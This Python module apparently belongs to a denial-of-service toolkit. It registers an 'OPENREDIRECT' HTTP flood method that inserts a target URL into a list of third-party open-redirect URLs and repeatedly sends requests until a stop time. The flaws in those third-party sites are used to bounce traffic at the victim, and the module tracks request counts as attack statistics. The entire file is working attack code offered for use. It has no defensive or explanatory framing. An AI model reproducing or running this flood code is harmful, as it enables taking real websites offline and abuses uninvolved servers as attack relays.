'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

'''
Module which abuses the Open Redirect vulnerability
'''

import time, requests
from src.core import Core
from src.utils import *
from src.useragent import *
from random import choice
from base64 import b64encode

with open(join(dirname(abspath(__file__)), 'files', 'openredirects.txt'), buffering=(16*1024*1024)) as file:
    openredirects = file.read().splitlines()

def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and Core.attackrunning:
        try:
            url_final = utils().buildblock(url)
            vuln_url = choice(openredirects).replace('$BASE64TARGET', b64encode(url_final.encode()).decode()).replace('$TARGET', url_final)

            req = Core.session.get(
                vuln_url, 
                headers=utils().buildheaders(url),
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None
            )

            #if req.status_code == 302: # impossible to reach, due to the ReadTimeout exception
            Core.infodict[attack_id]['req_sent'] += 1
            #else:
            #    Core.infodict[attack_id]['req_fail'] += 1

        except requests.exceptions.ReadTimeout: 
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1


Core.methods.update({
    'OPENREDIRECT': {
        'info': 'HTTP flood which abuses the Open Redirect vulnerability',
        'func': flood
    }
})